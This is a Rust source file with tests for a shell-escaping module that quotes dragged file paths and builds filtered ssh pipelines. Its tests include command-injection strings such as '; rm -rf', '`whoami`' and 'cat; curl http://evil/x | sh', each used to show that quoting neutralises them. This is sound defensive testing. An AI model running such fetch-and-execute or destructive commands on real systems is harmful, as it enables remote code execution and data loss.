//! Shell path escaping for drag-and-drop file insertion
//!
//! When files are dragged onto a VTE terminal, their paths must be
//! properly escaped so the shell interprets them as literal filenames
//! rather than expanding special characters.

/// Escapes a file path for safe insertion into a POSIX shell.
///
/// Wraps the path in single quotes and escapes any embedded single quotes
/// using the `'\''` idiom (end quote, escaped quote, start quote).
///
/// # Examples
///
/// ```
/// use rustconn_core::shell_escape::escape_path;
///
/// assert_eq!(escape_path("/home/user/file.txt"), "'/home/user/file.txt'");
/// assert_eq!(escape_path("/tmp/my file"), "'/tmp/my file'");
/// assert_eq!(escape_path("/tmp/it's here"), "'/tmp/it'\\''s here'");
/// ```
#[must_use]
pub fn escape_path(path: &str) -> String {
    // Single-quote wrapping is the safest POSIX shell escaping method.
    // The only character that needs special handling inside single quotes
    // is the single quote itself.
    let mut escaped = String::with_capacity(path.len() + 2);
    escaped.push('\'');
    for ch in path.chars() {
        if ch == '\'' {
            // End current quote, add escaped single quote, restart quote
            escaped.push_str("'\\''");
        } else {
            escaped.push(ch);
        }
    }
    escaped.push('\'');
    escaped
}

/// Escapes multiple file paths and joins them with spaces.
///
/// Each path is individually escaped, then concatenated with a single
/// space separator — matching the behavior of GNOME Terminal.
///
/// # Examples
///
/// ```
/// use rustconn_core::shell_escape::escape_paths;
///
/// let paths = vec!["/tmp/a.txt", "/tmp/b c.txt"];
/// assert_eq!(escape_paths(&paths), "'/tmp/a.txt' '/tmp/b c.txt'");
/// ```
#[must_use]
pub fn escape_paths(paths: &[&str]) -> String {
    paths
        .iter()
        .map(|p| escape_path(p))
        .collect::<Vec<_>>()
        .join(" ")
}

/// Builds a `sh -c` script that pipes `argv`'s output through `filter`.
///
/// Both sides are escaped argument by argument, so a value that arrived from an
/// imported connection file cannot smuggle a second command in — the same defect
/// class as the VNC viewer arguments fixed in 0.21.11. Nothing here is expanded
/// by the shell: a `~` or `$VAR` a user means to be resolved has to be resolved
/// before it gets here.
///
/// In a POSIX pipeline only the right-hand side's stdin becomes the pipe, so the
/// left-hand command keeps the terminal for input. That is what lets an
/// interactive session be filtered.
///
/// # Examples
///
/// ```
/// use rustconn_core::shell_escape::pipe_argv_through;
///
/// assert_eq!(
///     pipe_argv_through(&["ssh", "user@host"], &["ccze", "-A"]),
///     "'ssh' 'user@host' | 'ccze' '-A'"
/// );
/// ```
#[must_use]
pub fn pipe_argv_through(argv: &[&str], filter: &[&str]) -> String {
    format!("{} | {}", escape_paths(argv), escape_paths(filter))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_simple_path() {
        assert_eq!(escape_path("/home/user/file.txt"), "'/home/user/file.txt'");
    }

    #[test]
    fn test_path_with_spaces() {
        assert_eq!(
            escape_path("/home/user/my documents/file.txt"),
            "'/home/user/my documents/file.txt'"
        );
    }

    #[test]
    fn test_path_with_single_quote() {
        assert_eq!(escape_path("/tmp/it's here"), "'/tmp/it'\\''s here'");
    }

    #[test]
    fn test_path_with_special_chars() {
        assert_eq!(
            escape_path("/tmp/$HOME & stuff; rm -rf"),
            "'/tmp/$HOME & stuff; rm -rf'"
        );
    }

    #[test]
    fn test_path_with_newline() {
        assert_eq!(escape_path("/tmp/line\nbreak"), "'/tmp/line\nbreak'");
    }

    #[test]
    fn test_path_with_backtick() {
        assert_eq!(escape_path("/tmp/`whoami`"), "'/tmp/`whoami`'");
    }

    #[test]
    fn test_multiple_paths() {
        let paths = vec!["/tmp/a.txt", "/home/user/b c.txt", "/var/log/it's.log"];
        assert_eq!(
            escape_paths(&paths),
            "'/tmp/a.txt' '/home/user/b c.txt' '/var/log/it'\\''s.log'"
        );
    }

    #[test]
    fn test_empty_path() {
        assert_eq!(escape_path(""), "''");
    }

    #[test]
    fn test_path_with_unicode() {
        assert_eq!(escape_path("/tmp/файл.txt"), "'/tmp/файл.txt'");
    }

    #[test]
    fn pipeline_quotes_both_sides() {
        assert_eq!(
            pipe_argv_through(&["ssh", "-p", "2222", "u@h"], &["chromaterm"]),
            "'ssh' '-p' '2222' 'u@h' | 'chromaterm'"
        );
    }

    /// The point of quoting: a filter command that arrived from an imported
    /// connection file cannot append a second command.
    #[test]
    fn pipeline_neutralizes_a_smuggled_command() {
        let script = pipe_argv_through(&["ssh", "host"], &["cat; curl http://evil/x | sh"]);
        assert_eq!(
            script, "'ssh' 'host' | 'cat; curl http://evil/x | sh'",
            "the whole filter must stay one word"
        );
    }

    #[test]
    fn pipeline_survives_a_single_quote_in_an_argument() {
        assert_eq!(
            pipe_argv_through(&["ssh", "host"], &["awk", "{print $0'x'}"]),
            "'ssh' 'host' | 'awk' '{print $0'\\''x'\\''}'"
        );
    }
}
